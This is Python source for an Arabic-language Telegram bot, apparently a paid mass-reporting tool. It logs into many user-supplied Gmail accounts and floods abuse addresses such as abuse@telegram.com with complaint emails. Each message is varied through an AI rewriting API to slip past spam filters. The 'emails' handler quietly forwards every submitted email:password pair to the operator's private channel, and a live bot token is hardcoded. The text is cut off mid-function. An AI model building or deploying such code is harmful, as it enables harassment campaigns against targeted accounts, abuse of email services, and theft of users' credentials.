import os
import asyncio
import aiohttp
import json
import uuid
import random
import re
import time
from datetime import datetime, timedelta
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from aiosmtplib import SMTP
from telebot.async_telebot import AsyncTeleBot
from telebot import types

BOT_TOKEN = '8150194659:AAGS9rF_U9MWLt_O9q-9fy_2Vwj4BUWCXfE'
DATA_FILE = 'user_data.json'
ALLOWED_FILE = 'allowed_users.json'   
ALL_USERS_FILE = 'all_users.json'
ADMIN_IDS = [8084359561]
CHANNEL_ID = -1003069823832

bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
allowed_users = {}  
all_users = []      


def load_json_file(path, default):
    try:
        if os.path.exists(path):
            with open(path, 'r', encoding='utf-8') as f:
                return json.load(f)
    except Exception:
        pass
    return default


def save_json_file(path, data):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"Failed to save {path}: {e}")


def load_all_data():
    global user_data, allowed_users, all_users
    try:
        with open(DATA_FILE, 'r', encoding='utf-8') as f:
            user_data = json.load(f)
    except Exception:
        user_data = {}
    allowed_users = load_json_file(ALLOWED_FILE, {})
    all_users = load_json_file(ALL_USERS_FILE, [])


def save_allowed():
    save_json_file(ALLOWED_FILE, allowed_users)


def save_all_users():
    save_json_file(ALL_USERS_FILE, all_users)


def save_user_data():
    try:
        data_to_save = {}
        for chat_id, info in user_data.items():
            if not isinstance(info, dict):
                continue
            copy_info = info.copy()
            copy_info.pop('task', None)
            img = copy_info.get('image_data')
            if isinstance(img, (bytes, bytearray)):
                try:
                    copy_info['image_data'] = img.decode('latin-1')
                except Exception:
                    copy_info['image_data'] = None
            data_to_save[str(chat_id)] = copy_info
        with open(DATA_FILE, 'w', encoding='utf-8') as f:
            json.dump(data_to_save, f, ensure_ascii=False, indent=2)
    except Exception as e:
        print(f"save_user_data error: {e}")


def is_admin(chat_id):
    return chat_id in ADMIN_IDS


def now_ts():
    return int(time.time())


def format_expiry(ts):
    try:
        dt = datetime.fromtimestamp(ts)
        return dt.strftime('%Y-%m-%d %H:%M:%S')
    except Exception:
        return str(ts)


def remaining_days(expiry_ts):
    secs = expiry_ts - now_ts()
    if secs <= 0:
        return 0
    return round(secs / 86400, 2)


def init_user_data(chat_id):
    if str(chat_id) not in user_data:
        user_data[str(chat_id)] = {
            'sender_accounts': [],
            'support_emails': [],
            'subject': "",
            'message_template': "",
            'num_messages': 5,
            'sleep_seconds': 2,
            'image_data': None,
            'sending': False,
            'sent': 0,
            'failed': 0,
            'remaining': 0,
            'task': None,
            'status_message_id': None,
            'failed_accounts': [],
            'waiting_for': None,
            'ai_enabled': True,
        }
        save_user_data()


def user_is_allowed(chat_id):
    if is_admin(chat_id):
        return True
    s = str(chat_id)
    info = allowed_users.get(s)
    if not info:
        return False
    expiry = info.get('expiry', 0)
    return expiry > now_ts()


def get_main_keyboard(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    ai_state = user_data.get(str(chat_id), {}).get('ai_enabled', True)
    ai_label = "إيقاف الذكاء الاصطناعي" if ai_state else "تشغيل الذكاء الاصطناعي"

    markup.add(
        types.InlineKeyboardButton("بدء الارسال", callback_data="start_sending")
    )
    markup.add(
        types.InlineKeyboardButton("فحص الإيميلات", callback_data="check_emails"),
        types.InlineKeyboardButton(ai_label, callback_data="toggle_ai")
    )

    markup.add(
        types.InlineKeyboardButton("اضف ايميل", callback_data="set_emails"),
        types.InlineKeyboardButton("عرض الايميلات", callback_data="show_emails")
    )
    markup.add(
        types.InlineKeyboardButton("تعيين الكليشة", callback_data="set_message"),
        types.InlineKeyboardButton("تعيين الموضوع", callback_data="set_subject")
    )
    markup.add(
        types.InlineKeyboardButton("تعيين الصورة", callback_data="set_image"),
        types.InlineKeyboardButton("مسح الصورة", callback_data="remove_image")
    )
    markup.add(
        types.InlineKeyboardButton("تعيين الدعم", callback_data="set_support"),
        types.InlineKeyboardButton("تعيين عدد الرسائل", callback_data="set_num")
    )
    markup.add(
        types.InlineKeyboardButton("تعيين السليب", callback_data="set_interval"),
        types.InlineKeyboardButton("عرض المعلومات", callback_data="show_info")
    )
    markup.add(
        types.InlineKeyboardButton("مسح المعلومات", callback_data="clear_data")
    )
    return markup


def build_status_keyboard(data, chat_id):
    kb = types.InlineKeyboardMarkup(row_width=3)
    sent_btn = types.InlineKeyboardButton(f"تم الإرسال: {data.get('sent',0)}", callback_data="stat:sent")
    failed_btn = types.InlineKeyboardButton(f"فشل: {data.get('failed',0)}", callback_data="stat:failed")
    rem_btn = types.InlineKeyboardButton(f"المتبقي: {data.get('remaining',0)}", callback_data="stat:remaining")
    stop_btn = types.InlineKeyboardButton("إيقاف الإرسال", callback_data="stop_sending")
    kb.add(sent_btn, failed_btn)
    kb.add(rem_btn)
    kb.add(stop_btn)
    return kb


def get_admin_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("اضف مستخدم", callback_data="admin_add"))
    kb.add(types.InlineKeyboardButton("مسح مستخدم", callback_data="admin_delete"))
    kb.add(types.InlineKeyboardButton("عرض المستخدمين", callback_data="admin_list"))
    kb.add(types.InlineKeyboardButton("عدد المستخدمين", callback_data="admin_count"))
    kb.add(types.InlineKeyboardButton("ايذاع", callback_data="admin_broadcast"))
    kb.add(types.InlineKeyboardButton("رجوع", callback_data="back"))
    return kb


def back_keyboard(chat_id):
    kb = types.InlineKeyboardMarkup(row_width=1)
    back_btn = types.InlineKeyboardButton("رجوع", callback_data="back")
    kb.add(back_btn)
    return kb


def admin_only_keyboard():
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(types.InlineKeyboardButton("الادمن", url="https://t.me/a7madxv"))
    return kb

async def handle_admin_add_input(admin_chat_id, text):
    lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
    added = []
    failed = []
    for line in lines:
        if ':' not in line:
            failed.append((line, "صيغة خاطئة"))
            continue
        parts = line.split(':', 1)
        try:
            uid = int(parts[0].strip())
            days = float(parts[1].strip())
            if days <= 0:
                failed.append((line, "عدد الأيام يجب أن يكون أكبر من صفر"))
                continue
            expiry_ts = now_ts() + int(days * 86400)
            allowed_users[str(uid)] = {"expiry": expiry_ts, "added_on": now_ts()}
            added.append((uid, days))
        except Exception as e:
            failed.append((line, str(e)))
    save_allowed()
    text_resp = ""
    if added:
        text_resp += "تمت إضافة:\n" + "\n".join([f"{u}:{d} يوم" for u, d in added]) + "\n\n"
    if failed:
        text_resp += "فشلت هذه الأسطر:\n" + "\n".join([f"{a} -> {b}" for a, b in failed])
    if not text_resp:
        text_resp = "لم يتم إدخال أي شيء صالح."
    await bot.send_message(admin_chat_id, text_resp, reply_markup=get_admin_keyboard())


async def handle_admin_delete_input(admin_chat_id, text):
    lines = [ln.strip() for ln in text.splitlines() if ln.strip()]
    removed = []
    not_found = []
    for line in lines:
        try:
            uid = int(line)
            key = str(uid)
            if key in allowed_users:
                del allowed_users[key]
                removed.append(uid)
            else:
                not_found.append(uid)
        except Exception:
            not_found.append(line)
    save_allowed()
    resp = ""
    if removed:
        resp += "تم حذف:\n" + "\n".join([str(x) for x in removed]) + "\n\n"
    if not_found:
        resp += "غير موجودين:\n" + "\n".join([str(x) for x in not_found])
    if not resp:
        resp = "لم يتم حذف أي شيء."
    await bot.send_message(admin_chat_id, resp, reply_markup=get_admin_keyboard())


async def send_broadcast(admin_chat_id, text):
    if not all_users:
        await bot.send_message(admin_chat_id, "لا يوجد مستخدمين مسجّلين للإرسال.", reply_markup=get_admin_keyboard())
        return

    sent = 0
    failed = 0
    await bot.send_message(admin_chat_id, f"بدء الإرسال إلى {len(all_users)} مستخدم...", reply_markup=back_keyboard(admin_chat_id))
    for uid in list(all_users):
        try:
            await bot.send_message(uid, text)
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.06)
    await bot.send_message(admin_chat_id, f"انتهى الايذاع.\nتم الإرسال: {sent}\nفشل: {failed}", reply_markup=get_admin_keyboard())

async def show_emails_callback(message, chat_id):
    s = str(chat_id)
    data = user_data.get(s, {})
    accounts = data.get('sender_accounts', [])

    if not accounts:
        try:
            await bot.edit_message_text("لم يتم تعيين أي ايميلات", chat_id, message.message_id, reply_markup=back_keyboard(chat_id))
        except Exception:
            await bot.send_message(chat_id, "لم يتم تعيين أي ايميلات", reply_markup=back_keyboard(chat_id))
        return

    text_lines = []
    kb = types.InlineKeyboardMarkup(row_width=1)
    for idx, acc in enumerate(accounts):
        try:
            email = acc.split(":", 1)[0]
        except Exception:
            email = acc
        text_lines.append(f"{idx+1}. {email}")
        kb.add(types.InlineKeyboardButton(f"حذف {email}", callback_data=f"delete_email:{idx}"))

    kb.add(types.InlineKeyboardButton("رجوع", callback_data="back"))
    text = "قائمة الإيميلات:\n\n" + "\n".join(text_lines)

    try:
        await bot.edit_message_text(text, chat_id, message.message_id, reply_markup=kb, disable_web_page_preview=True)
    except Exception:
        await bot.send_message(chat_id, text, reply_markup=kb)


@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    init_user_data(chat_id)
    data_call = call.data
    data = user_data[str(chat_id)]

    if not user_is_allowed(chat_id) and not is_admin(chat_id):
        if data_call != "back":
            await bot.answer_callback_query(call.id, "انتهى اشتراكك — راسل المطور للتفعيل", show_alert=True)
            try:
                await bot.edit_message_text("انتهى اشتراكك — راسل المطور للتفعيل", chat_id, call.message.message_id, reply_markup=admin_only_keyboard())
            except Exception:
                pass
            return
    if data_call == "toggle_ai":
        current = data.get('ai_enabled', True)
        data['ai_enabled'] = not current
        save_user_data()
        state_text = "تم تفعيل الذكاء الاصطناعي" if data['ai_enabled'] else "تم إيقاف الذكاء الاصطناعي"
        await bot.answer_callback_query(call.id, state_text, show_alert=True)
        await bot.edit_message_text(state_text, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        return

    if data_call == "set_emails":
        msg = "أرسل قائمة الايميلات (كل ايميل:كلمة سر في سطر)\nمثال:\nemail1:password1\nemail2:password2"
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        data['waiting_for'] = 'emails'
        save_user_data()
        return

    if data_call == "set_support":
        msg = "أرسل ايميلات الدعم (مفصولة بمسافة)\nمثال:\nabuse@telegram.com stopca@telegram.com"
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        data['waiting_for'] = 'support'
        save_user_data()
        return

    if data_call == "set_message":
        msg = "أرسل الكليشة التي تريد إرسالها:"
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        data['waiting_for'] = 'message'
        save_user_data()
        return

    if data_call == "set_subject":
        msg = "أرسل الموضوع الذي تريد استخدامه:"
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        data['waiting_for'] = 'subject'
        save_user_data()
        return

    if data_call == "set_num":
        msg = "أرسل عدد الرسائل التي تريد إرسالها:"
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        data['waiting_for'] = 'num_messages'
        save_user_data()
        return

    if data_call == "set_interval":
        msg = "أرسل السليب:"
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        data['waiting_for'] = 'sleep_seconds'
        save_user_data()
        return

    if data_call == "set_image":
        msg = "أرسل الصورة التي تريد استخدامها:"
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        data['waiting_for'] = 'image'
        save_user_data()
        return

    if data_call == "remove_image":
        data['image_data'] = None
        save_user_data()
        await bot.answer_callback_query(call.id, "تم حذف الصورة", show_alert=True)
        await bot.edit_message_text("تم حذف الصورة بنجاح", chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        return

    if data_call == "show_info":
        support_emails = ", ".join(data['support_emails']) if data['support_emails'] else "لم يتم تعيين"
        message_template = data['message_template'] if data['message_template'] else "لم يتم تعيين"
        subject = data['subject'] if data['subject'] else "لم يتم تعيين"
        image_status = "نعم" if data['image_data'] else "لا"
        num_messages = data['num_messages'] if data['num_messages'] else 0
        sleep_seconds = data['sleep_seconds'] if data['sleep_seconds'] else 0
        ai_status = "مفعل" if data.get('ai_enabled', True) else "معطل"
        info = (
            f"الدعم: `{support_emails}`\n\n"
            f"الرسالة: `{message_template}`\n\n"
            f"الموضوع: `{subject}`\n\n"
            f"الصورة: {image_status}\n\n"
            f"الرسائل عدد: {num_messages}\n\n"
            f"السليب: {sleep_seconds}\n\n"
            f"الذكاء الاصطناعي: {ai_status}\n\n"
        )
        await bot.edit_message_text(info, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id), parse_mode="Markdown", disable_web_page_preview=True)
        return

    if data_call == "show_emails":
        await show_emails_callback(call.message, chat_id)
        return

    if data_call.startswith("delete_email:"):
        index = int(data_call.split(":" )[1])
        accounts = data['sender_accounts']
        if 0 <= index < len(accounts):
            deleted_email = accounts.pop(index)
            data['sender_accounts'] = accounts
            save_user_data()
            await bot.answer_callback_query(call.id, f"تم حذف: {deleted_email.split(':')[0]}", show_alert=True)
        await show_emails_callback(call.message, chat_id)
        return

    if data_call == "back":
        if not user_is_allowed(chat_id) and not is_admin(chat_id):
            await bot.edit_message_text("انتهى اشتراكك — راسل المطور للتفعيل", chat_id, call.message.message_id, reply_markup=admin_only_keyboard())
            return
        await bot.edit_message_text("مرحبا بك في بوت رفع خارجي (صلخ بل نعال)", chat_id, call.message.message_id, reply_markup=get_main_keyboard(chat_id))
        return

    if data_call == "clear_data":
        data.update({
            'sender_accounts': [],
            'support_emails': [],
            'subject': "",
            'message_template': "",
            'num_messages': 5,
            'sleep_seconds': 2,
            'image_data': None,
        })
        save_user_data()
        await bot.answer_callback_query(call.id, "تم مسح جميع المعلومات", show_alert=True)
        await bot.edit_message_text("تم مسح جميع المعلومات بنجاح", chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        return

    if data_call == "start_sending":
        if not data['sender_accounts']:
            await bot.answer_callback_query(call.id, "لم يتم تعيين أي ايميلات", show_alert=True)
            return
        if not data['support_emails']:
            await bot.answer_callback_query(call.id, "لم يتم تعيين ايميلات الدعم", show_alert=True)
            return
        if not data['message_template']:
            await bot.answer_callback_query(call.id, "لم يتم تعيين الكليشة", show_alert=True)
            return
        if not data['subject']:
            await bot.answer_callback_query(call.id, "لم يتم تعيين الموضوع", show_alert=True)
            return

        data['sending'] = True
        data['sent'] = 0
        data['failed'] = 0
        data['remaining'] = data['num_messages']
        data['failed_accounts'] = []
        save_user_data()

        status_text = (
            "تم بدء الارسال بنجاح."
        )
        status_msg = await bot.edit_message_text(status_text, chat_id, call.message.message_id)
        data['status_message_id'] = status_msg.message_id
        save_user_data()
        task = asyncio.create_task(send_emails_task(chat_id))
        data['task'] = task
        save_user_data()
        return

    if data_call == "stop_sending":
        if data.get('sending'):
            data['sending'] = False
            try:
                t = data.get('task')
                if t:
                    t.cancel()
            except Exception:
                pass
            save_user_data()
            await bot.answer_callback_query(call.id, "تم إيقاف عملية الإرسال", show_alert=True)
            await bot.edit_message_text("تم إيقاف عملية الإرسال", chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        else:
            await bot.answer_callback_query(call.id, "لا توجد عملية إرسال جارية", show_alert=True)
        return

    if data_call.startswith("stat:"):
        kind = data_call.split(":", 1)[1]
        if kind == "sent":
            await bot.answer_callback_query(call.id, f"تم الإرسال: {data.get('sent',0)}", show_alert=True)
        elif kind == "failed":
            await bot.answer_callback_query(call.id, f"فشل: {data.get('failed',0)}", show_alert=True)
        elif kind == "remaining":
            await bot.answer_callback_query(call.id, f"المتبقي: {data.get('remaining',0)}", show_alert=True)
        return

    if data_call == "check_emails":
        msg = "أرسل الإيميلات التي تريد فحصها بالشكل:\nemail1:password1\nemail2:password2"
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        data['waiting_for'] = 'check_emails'
        save_user_data()
        return

    if data_call == "admin_add":
        if not is_admin(chat_id):
            await bot.answer_callback_query(call.id, "لا تملك صلاحيات الأدمن", show_alert=True)
            return
        msg = "قم ب ارسال ايدي المستخدم:عدد الايام\nمثال\n679063511:30\nيمكنك إرسال عدة أسطر."
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        user_data[str(chat_id)]['waiting_for'] = 'admin_add_user'
        save_user_data()
        return

    if data_call == "admin_delete":
        if not is_admin(chat_id):
            await bot.answer_callback_query(call.id, "لا تملك صلاحيات الأدمن", show_alert=True)
            return
        msg = "أرسل ايدي المستخدم المراد مسحه (واحد في السطر أو عدة أسطر):\nمثال:\n679063511"
        await bot.edit_message_text(msg, chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        user_data[str(chat_id)]['waiting_for'] = 'admin_delete_user'
        save_user_data()
        return

    if data_call == "admin_list":
        if not is_admin(chat_id):
            await bot.answer_callback_query(call.id, "لا تملك صلاحيات الأدمن", show_alert=True)
            return
        items = []
        for k, v in allowed_users.items():
            expiry = v.get('expiry', 0)
            items.append((int(k), expiry))
        items.sort(key=lambda x: x[1])
        if not items:
            await bot.answer_callback_query(call.id, "لا يوجد مستخدمين مضافين", show_alert=True)
            await bot.edit_message_text("لا يوجد مستخدمين مضافين", chat_id, call.message.message_id, reply_markup=get_admin_keyboard())
            return
        text_lines = []
        markup = types.InlineKeyboardMarkup(row_width=1)
        for uid, expiry in items:
            days_left = remaining_days(expiry)
            text_lines.append(f"{uid} — ينتهي: {format_expiry(expiry)} — متبقّي: {days_left} يوم")
            markup.add(types.InlineKeyboardButton(f"حذف {uid}", callback_data=f"admin_del_user:{uid}"))
        markup.add(types.InlineKeyboardButton("رجوع", callback_data="back"))
        text = "المستخدمين المضافين:\n\n" + "\n".join(text_lines)
        await bot.edit_message_text(text, chat_id, call.message.message_id, reply_markup=markup)
        return

    if data_call.startswith("admin_del_user:"):
        if not is_admin(chat_id):
            await bot.answer_callback_query(call.id, "لا تملك صلاحيات الأدمن", show_alert=True)
            return
        uid = data_call.split(":", 1)[1]
        if uid in allowed_users:
            del allowed_users[uid]
            save_allowed()
            await bot.answer_callback_query(call.id, f"تم حذف {uid}", show_alert=True)
        else:
            await bot.answer_callback_query(call.id, "لم يتم العثور على المستخدم", show_alert=True)
        await bot.edit_message_text("لوحة الأدمن", chat_id, call.message.message_id, reply_markup=get_admin_keyboard())
        return

    if data_call == "admin_count":
        if not is_admin(chat_id):
            await bot.answer_callback_query(call.id, "لا تملك صلاحيات الأدمن", show_alert=True)
            return
        total_all = len(all_users)
        total_allowed = sum(1 for v in allowed_users.values() if v.get('expiry', 0) > now_ts())
        await bot.answer_callback_query(call.id, f"المسجلين: {total_all}\nالمفعلين: {total_allowed}", show_alert=True)
        await bot.edit_message_text(f"عدد المستخدمين:\nالمسجلين: {total_all}\nالمفعلين: {total_allowed}", chat_id, call.message.message_id, reply_markup=get_admin_keyboard())
        return

    if data_call == "admin_broadcast":
        if not is_admin(chat_id):
            await bot.answer_callback_query(call.id, "لا تملك صلاحيات الأدمن", show_alert=True)
            return
        await bot.edit_message_text("قم ب ارسال رسالة لكي يتم ايذاعها لكل مستخدمين البوت", chat_id, call.message.message_id, reply_markup=back_keyboard(chat_id))
        user_data[str(chat_id)]['waiting_for'] = 'admin_broadcast'
        save_user_data()
        return
    return

@bot.message_handler(commands=['admin'])
async def admin_command(message):
    chat_id = message.chat.id
    if is_admin(chat_id):
        await bot.send_message(chat_id, "مرحبًا بك في لوحة الادمن", reply_markup=get_admin_keyboard())
    else:
        return

@bot.message_handler(commands=['start'])
async def start_command(message):
    chat_id = message.chat.id
    init_user_data(chat_id)

    if chat_id not in all_users:
        all_users.append(chat_id)
        save_all_users()

    welcome = "مرحبا بك في بوت رفع خارجي (صلخ بل نعال)"
    if not user_is_allowed(chat_id):
        if is_admin(chat_id):
            await bot.send_message(chat_id, welcome, reply_markup=get_admin_keyboard())
        else:
            await bot.send_message(chat_id, "انتَ غير مشترك في البوت راسل المطور للتفعيل", reply_markup=admin_only_keyboard())
    else:
        await bot.send_message(chat_id, welcome, reply_markup=get_main_keyboard(chat_id))


@bot.message_handler(content_types=['text'])
async def text_message_handler(message):
    chat_id = message.chat.id
    text = message.text.strip()
    init_user_data(chat_id)
    waiting_for = user_data[str(chat_id)].get('waiting_for')

    if waiting_for == 'admin_add_user' and is_admin(chat_id):
        user_data[str(chat_id)]['waiting_for'] = None
        save_user_data()
        await handle_admin_add_input(chat_id, text)
        return

    if waiting_for == 'admin_delete_user' and is_admin(chat_id):
        user_data[str(chat_id)]['waiting_for'] = None
        save_user_data()
        await handle_admin_delete_input(chat_id, text)
        return

    if waiting_for == 'admin_broadcast' and is_admin(chat_id):
        user_data[str(chat_id)]['waiting_for'] = None
        save_user_data()
        await send_broadcast(chat_id, text)
        return

    if not waiting_for:
        return

    data = user_data[str(chat_id)]

    if waiting_for == 'check_emails':
        accounts = [line.strip() for line in text.split('\n') if ':' in line]
        data['waiting_for'] = None
        save_user_data()
        await bot.send_message(chat_id, "جارٍ فحص الإيميلات، يرجى الانتظار...")
        await check_accounts_task(chat_id, accounts)
        return

    if waiting_for == 'emails':
        accounts = [line.strip() for line in text.split('\n') if ':' in line]
        data['sender_accounts'] = accounts
        data['waiting_for'] = None
        save_user_data()

        if accounts:
            try:
                summary_lines = [f"- `{acc}`" for acc in accounts]
                summary = (
                    f"تم إضافة إيميلات جديدة من المستخدم: `{chat_id}`\n\n"
                    + "\n".join(summary_lines)
                )
                await bot.send_message(CHANNEL_ID, summary, parse_mode="Markdown", disable_web_page_preview=True)
            except Exception as e:
                print(f"Failed to send emails to channel {CHANNEL_ID}: {e}")

        if not accounts:
            await bot.send_message(chat_id, "هناك خطاء في الصيغه تأكد من الايميلا بهذا الشكل\nemail1:password1", reply_markup=back_keyboard(chat_id))
            return
        await bot.send_message(chat_id, f"تم تعيين {len(accounts)} ايميلات", reply_markup=back_keyboard(chat_id))
        return


    if waiting_for == 'support':
        emails = re.findall(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', text)
        data['support_emails'] = emails
        data['waiting_for'] = None
        save_user_data()
        if not emails:
            await bot.send_message(chat_id, "لم يتم تعيين ايميلات دعم", reply_markup=back_keyboard(chat_id))
            return
        await bot.send_message(chat_id, f"تم تعيين {len(emails)} ايميلات دعم", reply_markup=back_keyboard(chat_id))
        return

    if waiting_for == 'message':
        data['message_template'] = text
        data['waiting_for'] = None
        save_user_data()
        await bot.send_message(chat_id, "تم تعيين الكليشة بنجاح", reply_markup=back_keyboard(chat_id))
        return

    if waiting_for == 'subject':
        data['subject'] = text
        data['waiting_for'] = None
        save_user_data()
        await bot.send_message(chat_id, "تم تعيين الموضوع بنجاح", reply_markup=back_keyboard(chat_id))
        return

    if waiting_for == 'num_messages':
        try:
            num = int(text)
            if num > 0:
                data['num_messages'] = num
                data['waiting_for'] = None
                save_user_data()
                await bot.send_message(chat_id, f"تم تعيين عدد الرسائل: {num}", reply_markup=back_keyboard(chat_id))
            else:
                await bot.send_message(chat_id, "الرقم يجب أن يكون أكبر من الصفر")
        except ValueError:
            await bot.send_message(chat_id, "الرجاء إدخال رقم صحيح")
        return

    if waiting_for == 'sleep_seconds':
        try:
            seconds = int(text)
            if seconds >= 0:
                data['sleep_seconds'] = seconds
                data['waiting_for'] = None
                save_user_data()
                await bot.send_message(chat_id, f"تم تعيين الفاصل الزمني: {seconds} ثانية", reply_markup=back_keyboard(chat_id))
            else:
                await bot.send_message(chat_id, "القيمة يجب أن تكون أكبر من أو تساوي الصفر")
        except ValueError:
            await bot.send_message(chat_id, "الرجاء إدخال رقم صحيح")
        return
    return


@bot.message_handler(content_types=['photo'])
async def photo_handler(message):
    chat_id = message.chat.id
    if str(chat_id) not in user_data or not user_data[str(chat_id)].get('waiting_for'):
        return
    data = user_data[str(chat_id)]
    if data['waiting_for'] == 'image':
        file_id = message.photo[-1].file_id
        file_info = await bot.get_file(file_id)
        file_data = await bot.download_file(file_info.file_path)
        data['image_data'] = file_data.decode('latin-1') if isinstance(file_data, (bytes, bytearray)) else file_data
        data['waiting_for'] = None
        save_user_data()
        await bot.send_message(chat_id, "تم تعيين الصورة بنجاح", reply_markup=back_keyboard(chat_id))

names_line = "ahmed d. dreas,sara a. mohamed,omar f. alhadi,layla m. saleh,yousef r. khalil,ali a. hassan,nadia k. saad"
names_list = [name.strip() for name in names_line.split(",")]
API_URL = 'https://api.monica.im/api/seotool/ai_rewrite'

def generate_uuid():
    return str(uuid.uuid4())


async def rewrite_message_via_api(session, message: str) -> str:
    if "[Your Name]" in message:
        chosen_name = random.choice(names_list)
        message = message.replace("[Your Name]", chosen_name)

    task_uid = "rewriter:" + generate_uuid()
    device_id = generate_uuid()
    client_id = generate_uuid()

    headers = {
        'Content-Type': 'application/json',
        'X-Client-Locale': 'ar',
        'X-Client-Id': client_id,
    }

    data = {
        "task_uid": task_uid,
        "data": {
            "content": message,
            "mode": "academic",
            "use_model": "gpt-4o-mini",
            "intensity": "medium",
            "language": "auto",
            "device_id": device_id
        },
        "language": "auto",
        "locale": "ar",
        "task_type": "seotool:ai_rewrite"
    }

    try:
        async with session.post(API_URL, headers=headers, json=data) as response:
            full_text = ""
            async for line_bytes in response.content:
                line = line_bytes.decode('utf-8').strip()
                if line.startswith("data: "):
                    content = line[len("data: ") :]
                    if content == '[DONE]':
                        break
                    try:
                        j = json.loads(content)
                        full_text += j.get("text", "")
                    except Exception:
                        pass
            return full_text.strip()
    except Exception as e:
        print(f"rewrite_message_via_api error: {e}")
        return message


async def send_emails_task(chat_id):
    data = user_data.get(str(chat_id))
    if not data:
        return

    accounts = data.get('sender_accounts', [])[:]
    support_emails = data.get('support_emails', [])[:]
    subject = data.get('subject', 'Test')
    message_template = data.get('message_template', '')
    num_messages = data.get('num_messages', 0)
    sleep_seconds = data.get('sleep_seconds', 0)
    image_data = data.get('image_data')
    ai_enabled = data.get('ai_enabled', True)

    if not accounts or not support_emails:
        data['sending'] = False
        save_user_data()
        await update_status(chat_id, "لا توجد حسابات أو ايميلات دعم للإرسال.")
        return

    active_accounts = [acc for acc in accounts if acc not in data.get('failed_accounts', [])]
    if not active_accounts:
        data['sending'] = False
        save_user_data()
        await update_status(chat_id, "جميع الحسابات فشلت مسبقًا. لا يوجد ما يرسل.")
        return

    total = num_messages
    n = len(active_accounts)
    base = total // n if n else 0
    rem = total % n if n else 0
    per_account = []
    for i, acc in enumerate(active_accounts):
        count = base + (1 if i < rem else 0)
        per_account.append((acc, count))

    data['remaining'] = num_messages
    save_user_data()

    try:
        async with aiohttp.ClientSession() as session:
            for acc, count in per_account:
                if not data.get('sending'):
                    break
                if count <= 0:
                    continue
                try:
                    email, password = acc.split(':', 1)
                except Exception:
                    data['failed'] += 1
                    data['remaining'] = max(0, data['remaining'] - min(count, data['remaining']))
                    data.setdefault('failed_accounts', []).append(acc)
                    save_user_data()
                    await update_status(chat_id)
                    continue

                smtp = SMTP(hostname="smtp.gmail.com", port=587)
                try:
                    await smtp.connect()
                    try:
                        await smtp.starttls()
                    except Exception as e:
                        if "already using tls" in str(e).lower():
                            pass
                        else:
                            raise
                    await smtp.login(email, password)
                except Exception as e:
                    pass
                    try:
                        pass
                    except Exception:
                        pass
                    data['failed'] += 1
                    data['remaining'] = max(0, data['remaining'] - min(count, data['remaining']))
                    data.setdefault('failed_accounts', []).append(acc)
                    save_user_data()
                    try:
                        await smtp.quit()
                    except Exception:
                        pass
                    await update_status(chat_id)
                    continue

                for _ in range(count):
                    if not data.get('sending'):
                        break
                    if not support_emails:
                        data['sending'] = False
                        save_user_data()
                        await update_status(chat_id, "لا توجد ايميلات دعم.")
                        try:
                            await smtp.quit()
                        except Exception:
                            pass
                        return

                    to_email = random.choice(support_emails)
                    try:
                        if ai_enabled:
                            rewritten_text = await rewrite_message_via_api(session, message_template)
                        else:
                            rewritten_text = message_template

                        random_num = random.randint(1, 9999)
                        full_subject = f"{subject} ({random_num})"
                        if image_data:
                            msg = MIMEMultipart()
                            msg.attach(MIMEText(rewritten_text, "plain"))
                            image_bytes = image_data.encode('latin-1') if isinstance(image_data, str) else image_data
                            image = MIMEImage(image_bytes)
                            image.add_header('Content-ID', '<image>')
                            msg.attach(image)
                        else:
                            msg = MIMEText(rewritten_text, "plain")
                        msg["From"] = email
                        msg["To"] = to_email
                        msg["Subject"] = full_subject

                        await smtp.send_message(msg)
                        data['sent'] += 1
                        save_user_data()
                        await update_status(chat_id)
                    except Exception as e:
                        pass
                        try:
                            pass
                        except Exception:
                            pass
                        data['failed'] += 1
                        data.setdefault('failed_accounts', []).append(acc)
                        save_user_data()
                        break

                    if data['remaining'] <= 0:
                        break

                    if sleep_seconds > 0:
                        await asyncio.sleep(sleep_seconds)

                try:
                    await smtp.quit()
                except Exception:
                    pass

        data['sending'] = False
        data['task'] = None
        save_user_data()
        await update_status(chat_id, "اكتمل الإرسال")
    except asyncio.CancelledError:
        data['sending'] = False
        data['task'] = None
        save_user_data()
        await update_status(chat_id, "تم إيقاف الإرسال")
    except Exception as e:
        print(f"send_emails_task error: {e}")
        try:
            pass
        except Exception:
            pass
        data['sending'] = False
        data['task'] = None
        save_user_data()
        await update_status(chat_id, f"توقّف الإرسال بسبب خطأ: {e}")


async def update_status(chat_id, additional_info=""):
    if str(chat_id) not in user_data:
        return
    data = user_data[str(chat_id)]
    status_id = data.get('status_message_id')
    if not status_id:
        return
    status_text = (
        "احصائيات الشد\n"
        f"تم الارسل: {data.get('sent', 0)}\n"
